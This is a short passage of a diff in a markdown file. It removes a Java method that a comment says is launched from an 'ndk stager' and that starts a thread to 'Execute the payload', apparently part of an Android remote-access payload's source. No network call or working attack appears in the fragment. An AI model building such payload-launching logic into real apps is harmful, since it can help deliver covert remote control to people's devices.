@@ -98,19 +98,6 @@ finish();
             start(context);
         }
     }
-
-    // Launched from ndk stager
-    public static void startInPath(String path) {
-        parameters = new Object[]{ path , configBytes };
-        new Thread() {
-            @Override
-            public void run() {
-                // Execute the payload
-                Payload.main(null);
-            }
-        }.start();
-    }
-
 ```
 - ConnectionManager.java
 ```java
